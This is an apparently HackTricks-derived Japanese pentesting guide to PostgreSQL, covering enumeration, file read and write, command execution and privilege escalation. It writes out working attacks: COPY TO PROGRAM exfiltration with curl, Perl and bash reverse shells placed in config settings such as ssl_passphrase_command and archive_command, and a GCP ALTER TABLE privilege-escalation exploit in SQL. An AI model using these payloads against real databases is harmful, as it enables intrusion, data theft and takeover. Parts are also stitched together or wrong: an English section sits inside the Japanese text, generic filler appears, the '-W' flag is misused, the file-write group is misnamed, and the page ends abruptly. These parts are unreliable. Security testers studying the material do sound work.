# 5432,5433 - PostgreSQLのペンテスト

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **基本情報**

**PostgreSQL**は、SQL言語を使用しているオープンソースのオブジェクト関係データベースシステムです。

**デフォルトポート：** 5432で、このポートが既に使用されている場合、おそらく使用されていない次のポート（おそらく5433）がpostgresqlに使用されます。
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## 接続

To connect to a PostgreSQL database, you can use the `psql` command-line tool. The basic syntax is as follows:

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

- `<host>`: The hostname or IP address of the PostgreSQL server.
- `<port>`: The port number on which the PostgreSQL server is listening (default is 5432).
- `<username>`: The username to connect to the database.
- `<database>`: The name of the database to connect to.

If the PostgreSQL server is running on the local machine, you can omit the `-h` option and use `localhost` as the `<host>` value. Similarly, if the server is using the default port, you can omit the `-p` option.

Once connected, you will be prompted to enter the password for the specified username. If the password is correct, you will be logged in to the PostgreSQL database and can start executing SQL queries. To exit the `psql` tool, you can use the `\q` command.

Note: Make sure you have the necessary permissions to connect to the database.
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
Select user;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;

# Get history of commands executed
\s
```
**列挙**

PostgreSQLのデータベースを乱用する方法についての詳細は、以下を参照してください：

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ポートスキャン**

[**この研究**](https://www.exploit-db.com/papers/13084)によると、接続試行が失敗した場合、`dblink`は`sqlclient_unable_to_establish_sqlconnection`という例外をスローし、エラーの説明を含めます。以下にこれらの詳細の例を示します。
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ホストがダウンしています

`詳細: サーバーに接続できませんでした: ホストへのルートがありません。ホスト「1.2.3.4」でTCP/IP接続をポート5678で受け付けていますか？`

* ポートが閉じています
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* ポートが開いています
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
または
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* ポートが開いているかフィルタリングされているか
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
残念ながら、PL/pgSQL関数内で例外の詳細を取得する方法はありません。ただし、PostgreSQLサーバーに直接接続できれば、詳細を取得することができます。システムテーブルから直接ユーザ名とパスワードを取得することができない場合は、前のセクションで説明したワードリスト攻撃が成功する可能性があります。

## 特権の列挙

### ロール

| ロールの種類   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ロールにはスーパーユーザー特権があります                                                                                                                        |
| rolinherit     | ロールは、そのメンバーであるロールの特権を自動的に継承します                                                                                                    |
| rolcreaterole  | ロールは他のロールを作成できます                                                                                                                           |
| rolcreatedb    | ロールはデータベースを作成できます                                                                                                                            |
| rolcanlogin    | ロールはログインできます。つまり、このロールは初期セッション認証識別子として与えることができます                                                     |
| rolreplication | ロールはレプリケーションロールです。レプリケーションロールはレプリケーション接続を開始し、レプリケーションスロットを作成および削除することができます。                           |
| rolconnlimit   | ログインできるロールの場合、この設定はこのロールが作成できる同時接続の最大数を設定します。-1は制限なしを意味します。                                 |
| rolpassword    | パスワードではありません（常に`********`と表示されます）                                                                                                        |
| rolvaliduntil  | パスワードの有効期限（パスワード認証にのみ使用される）。期限がない場合はnullです。                                                                  |
| rolbypassrls   | ロールはすべての行レベルセキュリティポリシーをバイパスします。詳細については、[セクション5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)を参照してください。 |
| rolconfig      | 実行時設定変数のロール固有のデフォルト                                                                                                                    |
| oid            | ロールのID                                                                                                                                           |

#### 興味深いグループ

* もし**`pg_execute_server_program`**のメンバーであれば、**プログラムを実行**できます
* もし**`pg_read_server_files`**のメンバーであれば、**ファイルを読み取る**ことができます
* もし**`pg_write_server_files`**のメンバーであれば、**ファイルを書き込む**ことができます

{% hint style="info" %}
Postgresでは、**ユーザー**、**グループ**、**ロール**は**同じもの**です。それは単に**使用方法**と**ログインを許可するかどうか**に依存します。
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### テーブル

| Command | Description |
|---------|-------------|
| `\dt`   | List all tables in the current database. |
| `\d+`   | Show detailed information about a specific table. |
| `\d table_name` | Show detailed information about a specific table. |
| `\dS`   | Show detailed information about system tables. |
| `\dS+`  | Show detailed information about system tables, including additional statistics. |
| `\d+ table_name` | Show detailed information about a specific table, including additional statistics. |
| `\l+`   | List all databases, including additional information such as size and description. |
| `\du`   | List all users and their roles. |
| `\dp`   | List all privileges on database objects. |
| `\df`   | List all functions. |
| `\dv`   | List all views. |
| `\di`   | List all indexes. |
| `\ds`   | List all sequences. |
| `\dm`   | List all materialized views. |
| `\dT`   | List all data types. |
| `\dc`   | List all conversions. |
| `\do`   | List all operators. |
| `\dC`   | List all collations. |
| `\dE`   | List all foreign data wrappers. |
| `\dx`   | List all extensions. |
| `\dy`   | List all event triggers. |
| `\dD`   | List all domains. |
| `\dF`   | List all text search configurations. |
| `\dL`   | List all procedural languages. |
| `\dO`   | List all operators of a specific type. |
| `\dT+`  | Show detailed information about a specific data type. |
| `\dC+`  | Show detailed information about a specific collation. |
| `\dE+`  | Show detailed information about a specific foreign data wrapper. |
| `\dx+`  | Show detailed information about a specific extension. |
| `\dy+`  | Show detailed information about a specific event trigger. |
| `\dD+`  | Show detailed information about a specific domain. |
| `\dF+`  | Show detailed information about a specific text search configuration. |
| `\dL+`  | Show detailed information about a specific procedural language. |
| `\dO+`  | Show detailed information about a specific operator of a specific type. |

| コマンド | 説明 |
|---------|-------------|
| `\dt`   | 現在のデータベース内のすべてのテーブルをリストします。 |
| `\d+`   | 特定のテーブルに関する詳細情報を表示します。 |
| `\d table_name` | 特定のテーブルに関する詳細情報を表示します。 |
| `\dS`   | システムテーブルに関する詳細情報を表示します。 |
| `\dS+`  | 追加の統計情報を含むシステムテーブルに関する詳細情報を表示します。 |
| `\d+ table_name` | 追加の統計情報を含む特定のテーブルに関する詳細情報を表示します。 |
| `\l+`   | サイズや説明などの追加情報を含むすべてのデータベースをリストします。 |
| `\du`   | すべてのユーザーとその役割をリストします。 |
| `\dp`   | データベースオブジェクトのすべての権限をリストします。 |
| `\df`   | すべての関数をリストします。 |
| `\dv`   | すべてのビューをリストします。 |
| `\di`   | すべてのインデックスをリストします。 |
| `\ds`   | すべてのシーケンスをリストします。 |
| `\dm`   | すべてのマテリアライズドビューをリストします。 |
| `\dT`   | すべてのデータ型をリストします。 |
| `\dc`   | すべての変換をリストします。 |
| `\do`   | すべての演算子をリストします。 |
| `\dC`   | すべての照合順序をリストします。 |
| `\dE`   | すべての外部データラッパーをリストします。 |
| `\dx`   | すべての拡張機能をリストします。 |
| `\dy`   | すべてのイベントトリガをリストします。 |
| `\dD`   | すべてのドメインをリストします。 |
| `\dF`   | すべてのテキスト検索設定をリストします。 |
| `\dL`   | すべての手続き言語をリストします。 |
| `\dO`   | 特定のタイプの演算子をリストします。 |
| `\dT+`  | 特定のデータ型に関する詳細情報を表示します。 |
| `\dC+`  | 特定の照合順序に関する詳細情報を表示します。 |
| `\dE+`  | 特定の外部データラッパーに関する詳細情報を表示します。 |
| `\dx+`  | 特定の拡張機能に関する詳細情報を表示します。 |
| `\dy+`  | 特定のイベントトリガに関する詳細情報を表示します。 |
| `\dD+`  | 特定のドメインに関する詳細情報を表示します。 |
| `\dF+`  | 特定のテキスト検索設定に関する詳細情報を表示します。 |
| `\dL+`  | 特定の手続き言語に関する詳細情報を表示します。 |
| `\dO+`  | 特定のタイプの演算子に関する詳細情報を表示します。 |
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### 関数

PostgreSQLは、データベース内で使用できるさまざまな関数を提供しています。これらの関数は、データの操作や計算、変換などの目的で使用されます。以下に、よく使用される関数のいくつかを紹介します。

#### 文字列関数

- `length(string)`：指定した文字列の長さを返します。
- `substring(string, start, length)`：指定した文字列の一部を切り出します。
- `concat(string1, string2)`：2つの文字列を連結します。
- `lower(string)`：指定した文字列を小文字に変換します。
- `upper(string)`：指定した文字列を大文字に変換します。

#### 数値関数

- `abs(number)`：指定した数値の絶対値を返します。
- `round(number, decimal_places)`：指定した数値を指定した小数桁数に丸めます。
- `floor(number)`：指定した数値を切り捨てます。
- `ceiling(number)`：指定した数値を切り上げます。

#### 日付関数

- `now()`：現在の日時を返します。
- `date_part('part', date)`：指定した日付の特定の部分（年、月、日など）を返します。
- `date_trunc('part', date)`：指定した日付を指定した部分まで切り捨てます。

これらの関数は、データベース内でのデータ操作やクエリの作成に役立ちます。
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## ファイルシステムの操作

### ディレクトリとファイルの読み取り

この[**commit**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)から、**`DEFAULT_ROLE_READ_SERVER_FILES`**グループ（**`pg_read_server_files`**と呼ばれる）のメンバーと**スーパーユーザー**は、任意のパスで**`COPY`**メソッドを使用することができます（`genfile.c`の`convert_and_check_filename`をチェックしてください）。
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
スーパーユーザーではないが、**CREATEROLE** 権限を持っている場合、**自分自身をそのグループのメンバーにすることができます:**
```sql
GRANT pg_read_server_files TO username;
```
[**詳細情報**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

他の**postgres関数**を使用して、**ファイルを読み取るかディレクトリをリストする**ことができます。これらの関数は、**スーパーユーザー**および**明示的な権限を持つユーザー**のみが使用できます。
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
より多くの関数は[https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)で見つけることができます。

### 簡単なファイル書き込み

ファイルの書き込みには、**スーパーユーザー**と**`pg_read_server_files`**のメンバーのみがcopyを使用できます。
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% hint style="warning" %}
スーパーユーザーではないが、**`CREATEROLE`** 権限を持っている場合、**そのグループのメンバーに自分自身を追加することができます:**
```sql
GRANT pg_write_server_files TO username;
```
[**詳細情報**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

COPYは改行文字を処理できないため、ベース64ペイロードを使用していても、**1行のコマンドを送信する必要があります**。\
このテクニックの非常に重要な制限は、**`copy`はバイナリファイルの書き込みに使用できないため、一部のバイナリ値を変更します。**

### **バイナリファイルのアップロード**

ただし、**大きなバイナリファイルをアップロードするための他のテクニック**があります：

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**バグバウンティのヒント**：**Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCE

### **プログラムへのRCE**

[バージョン9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)以降、RCEには**スーパーユーザー**と**`pg_execute_server_program`**グループのメンバーのみがcopyを使用できます（例：情報の外部流出：
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
実行の例:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
スーパーユーザーではないが、**`CREATEROLE`** 権限を持っている場合、**そのグループのメンバーに自分自身を追加することができます:**
```sql
GRANT pg_execute_server_program TO username;
```
[**詳細はこちら**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

または、**metasploit**の`multi/postgres/postgres_copy_from_program_cmd_exec`モジュールを使用します。この脆弱性についての詳細は[**こちら**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)を参照してください。CVE-2019-9193として報告されていますが、Postgesはこれを[機能として修正しない](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)と宣言しました。

### PostgreSQL言語を使用したRCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL拡張機能を使用したRCE

前の投稿から**バイナリファイルのアップロード方法**を学んだ後、**PostgreSQL拡張機能をアップロードしてロードする**ことで**RCEを取得**しようとすることができます。

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL設定ファイルRCE

PostgreSQLの**設定ファイル**は、データベースを実行している**postgresユーザー**によって**書き込み可能**です。したがって、**スーパーユーザー**としてファイルシステムにファイルを書き込むことができ、したがってこのファイルを**上書き**することができます。

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_commandを使用したRCE**

設定ファイルには、RCEにつながる可能性のあるいくつかの興味深い属性があります。

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` データベースのプライベートキーへのパス
* `ssl_passphrase_command = ''` プライベートファイルがパスワードで保護されている場合（暗号化されている場合）、postgresqlはこの属性で指定されたコマンドを実行します。
* `ssl_passphrase_command_supports_reload = off` この属性が**オン**の場合、キーがパスワードで保護されている場合に実行される**コマンド**は、`pg_reload_conf()`が**実行**されたときに**実行されます**。

したがって、攻撃者は次の手順を実行する必要があります：

1. サーバーから**プライベートキーをダンプ**する
2. ダウンロードしたプライベートキーを**暗号化**する：`rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. 上書きする
4. 現在のpostgresqlの**設定**を**ダンプ**する
5. 上記の属性設定で**設定**を**上書き**する：
   - `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   - `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`を実行する

これをテストしてみたところ、**プライベートキーファイルが640の権限を持ち**、**rootが所有**し、**グループssl-certまたはpostgres**（postgresユーザーが読み取れるように）である必要があることがわかりました。また、_ /var/lib/postgresql/12/main_に配置されている必要があります。

このテクニックについての**詳細は[こちら](https://pulsesecurity.co.nz/articles/postgres-sqli)**を参照してください。

#### **archive\_commandを使用したRCE**

設定ファイルのもう1つの攻撃可能な属性は`archive_command`です。

これを動作させるには、`archive_mode`設定が`'on'`または`'always'`である必要があります。それが真である場合、`archive_command`のコマンドを上書きして、WAL（Write-Ahead Logging）操作を介して実行することができます。

一般的な手順は次のとおりです：

1. アーカイブモードが有効かどうかを確認する：`SELECT current_setting('archive_mode')`
2. ペイロードで`archive_command`を上書きする。たとえば、リバースシェル：`archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. 設定をリロードする：`SELECT pg_reload_conf()`
4. WAL操作を強制的に実行し、アーカイブコマンドを呼び出す：`SELECT pg_switch_wal()`または一部のPostgresバージョンでは`SELECT pg_switch_xlog()`

この設定とWALに関する**詳細は[こちら](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**を参照してください。

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

[**ドキュメント**](https://www.postgresql.org/docs/13/sql-grant.html)によると、**`CREATEROLE`**権限を持つロールは、**スーパーユーザーではない****任意のロールのメンバーシップを付与または取り消す**ことができます。

したがって、**`CREATEROLE`**権限がある場合、他の**ロール**（スーパーユーザーではない）へのアクセス権限を自分自身に付与することができ、ファイルの読み書きやコマンドの実行などのオプションを得ることができます。
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### パスワードの変更

この役割を持つユーザーは、他の**非スーパーユーザー**の**パスワード**を**変更**することもできます。
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSERへの特権昇格

**ローカルユーザーがパスワードを入力せずにPostgreSQLにログインできる**ことは非常に一般的です。したがって、**コードの実行権限を取得した後は、これらの権限を悪用して`SUPERUSER`ロールを取得**することができます。
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
これは通常、**`pg_hba.conf`** ファイル内の次の行によって可能になります：
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLEの特権昇格**

[この解説記事](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)では、Postgres GCPでALTER TABLEの特権を悪用して特権昇格が可能であった方法が説明されています。

通常、別のユーザーをテーブルの所有者にすることはエラーが発生するはずですが、どうやらGCPでは非スーパーユーザーのpostgresユーザーにそのオプションが与えられていました。

この考えを結びつけると、INSERT/UPDATE/ANALYZEコマンドがインデックス関数を持つテーブルで実行されると、関数はコマンドの一部としてテーブルの所有者の権限で呼び出されることがわかります。そのため、関数を使用してインデックスを作成し、そのテーブルに対して所有者の特権を持つスーパーユーザーに与え、その後、悪意のある関数を使用してテーブル上でANALYZEを実行することが可能です。これにより、所有者の特権を使用してコマンドを実行することができます。
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### 悪用

1. 新しいテーブルを作成します。
2. ダミーのコンテンツをテーブルに挿入し、インデックス関数が処理するものを用意します。
3. テーブルに悪意のあるインデックス関数（コード実行ペイロードを含む）を作成します。
4. テーブルの所有者を cloudsqladmin に変更します。これはGCPのスーパーユーザーロールであり、Cloud SQLがデータベースを維持および管理するためにのみ使用されます。
5. テーブルをANALYZEし、PostgreSQLエンジンがユーザーコンテキストをテーブルの所有者（cloudsqladmin）に切り替え、cloudsqladminの権限で悪意のあるインデックス関数を呼び出すことで、以前に実行する権限がなかったシェルコマンドを実行します。

PostgreSQLでは、このフローは次のようになります：
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
実行したエクスプロイトSQLクエリの後、`shell_commands_results`テーブルには実行されたコードの出力が含まれています。
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### ローカルログイン

一部の設定ミスのあるPostgreSQLインスタンスでは、任意のローカルユーザーのログインが許可される場合があります。**`dblink`関数**を使用して、127.0.0.1からローカルログインすることができます。
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
前のクエリが動作するためには、**`dblink`関数が存在する必要があります**。存在しない場合は、以下のコマンドで作成してみることができます。
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

もし特権を持つユーザーのパスワードを持っているが、そのユーザーは外部IPからのログインが許可されていない場合、以下の関数を使用してそのユーザーとしてクエリを実行することができます。
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'Select usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
この関数が存在するかどうかを確認することができます。以下の方法で確認できます。
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **SECURITY DEFINERを持つカスタム定義関数**

[この解説記事](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)では、IBMが提供するPostgreSQLインスタンス内で、ペンテスターが**SECURITY DEFINERフラグを持つこの関数**を見つけたため、特権昇格が可能になりました。

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

[ドキュメントで説明されているように](https://www.postgresql.org/docs/current/sql-createfunction.html)、**SECURITY DEFINERを持つ関数は**、それを所有するユーザーの特権で実行されます。したがって、関数が**SQLインジェクションの脆弱性を持っている**か、攻撃者が制御するパラメータで**特権のあるアクションを実行している**場合、PostgreSQL内で特権昇格が悪用される可能性があります。

前のコードの4行目で、関数には**SECURITY DEFINER**フラグがあることがわかります。
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
そして、**コマンドを実行**します：

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQLを使用したパスワードブルートフォース

PL/pgSQLは、**完全な機能を備えたプログラミング言語**であり、SQLよりもはるかに手続き的な制御が可能です。ループや他の制御構造を使用することができます。SQL文やトリガーは、PL/pgSQL言語で作成された関数を呼び出すことができます。\
**この言語を悪用して、PostgreSQLにユーザーの資格情報をブルートフォースさせることができます。**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### ロギング

_**postgresql.conf**_ ファイルの中で、以下の設定を変更することで、PostgreSQL のログを有効にすることができます。
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
次に、**サービスを再起動**します。

### pgadmin

